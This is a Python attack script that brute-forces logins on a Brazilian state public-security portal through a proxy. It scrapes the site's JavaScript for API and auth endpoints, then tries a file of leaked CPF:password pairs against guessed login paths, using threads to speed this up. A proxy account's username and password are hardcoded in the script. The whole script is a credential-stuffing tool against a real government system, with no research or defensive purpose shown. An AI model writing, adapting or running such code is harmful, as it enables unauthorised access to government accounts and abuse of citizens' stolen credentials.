#!/usr/bin/env python3
"""
Brute Force SSP GO Portal - via PROXY
"""
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()

TARGET = "https://mportal.ssp.go.gov.br"
PROXY = "http://glflytku:qjy9vrlulx4v@45.38.89.92:6027"
CRED_FILE = "/home/runner/workspace/attached_assets/sso.ssp.go.gov.br__CPF-1205_1780591746708.txt"

PROXIES = {'http': PROXY, 'https': PROXY}

# First, get the real page to understand login structure
session = requests.Session()
session.proxies = PROXIES
session.verify = False

print("[INFO] Getting main page...")
r = session.get(TARGET, timeout=15)
print(f"[INFO] Status: {r.status_code}, len: {len(r.text)}")

# Find login endpoint from JS
js_url = TARGET + "/scripts/scripts.604fb85d.js"
js = session.get(js_url, timeout=15)
print(f"[INFO] JS status: {js.status_code}")

# Extract API endpoints
import re
apis = re.findall(r'[\"\'](https?://[^\"\']+)[\"\']', js.text)
print(f"[INFO] External APIs found: {len(set(apis))}")
for a in list(set(apis))[:10]:
    print(f"  -> {a}")

endpoints = re.findall(r'[\"\'](/api/[^\"\']+)[\"\']', js.text)
print(f"[INFO] Internal endpoints: {len(set(endpoints))}")
for e in list(set(endpoints))[:10]:
    print(f"  -> {e}")

# Find login/auth patterns
auth_patterns = re.findall(r'(login|auth|token|session)[\"\']?\s*[:=]\s*[\"\']([^\"\']+)[\"\']', js.text, re.IGNORECASE)
print(f"[INFO] Auth patterns: {len(auth_patterns)}")
for p in auth_patterns[:10]:
    print(f"  -> {p}")

# Test credentials
print("\n[INFO] Loading credentials...")
creds = []
with open(CRED_FILE, 'r') as f:
    for line in f:
        line = line.strip()
        if ':' in line:
            parts = line.split(':', 1)
            creds.append((parts[0], parts[1]))

print(f"[INFO] Total credentials: {len(creds)}")

# Test first 10 to find login endpoint
def test_login(cpf, senha):
    try:
        # Try common login endpoints
        endpoints = [
            '/api/login',
            '/api/auth',
            '/api/authenticate',
            '/login',
            '/auth',
            '/api/v1/login',
            '/api/v1/auth',
        ]
        for endpoint in endpoints:
            url = TARGET + endpoint
            data = {'username': cpf, 'password': senha, 'cpf': cpf, 'senha': senha}
            for payload in [data, {'username': cpf, 'password': senha}]:
                r = session.post(url, data=payload, timeout=10, allow_redirects=False)
                if r.status_code == 200:
                    text = r.text.lower()
                    if 'token' in text or 'success' in text or 'dashboard' in text or 'redirect' in text:
                        return (cpf, senha, endpoint, r.status_code, 'SUCCESS')
                elif r.status_code in [301, 302, 307, 308]:
                    return (cpf, senha, endpoint, r.status_code, 'REDIRECT')
        return None
    except Exception as e:
        return None

print("[INFO] Testing 10 credentials to find login endpoint...")
found = []
for cpf, senha in creds[:10]:
    result = test_login(cpf, senha)
    if result:
        print(f"[VALID] {result}")
        found.append(result)

if not found:
    print("[INFO] No valid credentials found in first 10")
    print("[INFO] Testing with more credentials...")
    with ThreadPoolExecutor(max_workers=3) as ex:
        futures = {ex.submit(test_login, c, s): (c, s) for c, s in creds[10:50]}
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"[VALID] {result}")
                found.append(result)

print(f"\n[RESULT] Total valid: {len(found)}")
for f in found:
    print(f"  -> {f}")
